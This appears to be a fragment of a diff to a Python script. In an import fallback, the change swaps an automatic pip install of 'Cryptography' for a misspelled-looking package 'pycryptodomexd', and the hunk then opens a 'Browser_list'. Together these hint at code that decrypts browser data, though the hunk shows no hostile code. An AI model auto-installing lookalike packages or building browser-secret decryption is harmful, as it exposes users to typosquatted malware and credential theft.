@@ -27,7 +27,7 @@ except ImportError:
 try:
     from Cryptodome.Cipher import AES
 except ImportError:
-    install('Cryptography')
+    install('pycryptodomexd')
     from Cryptodome.Cipher import AES
 
 Browser_list = [
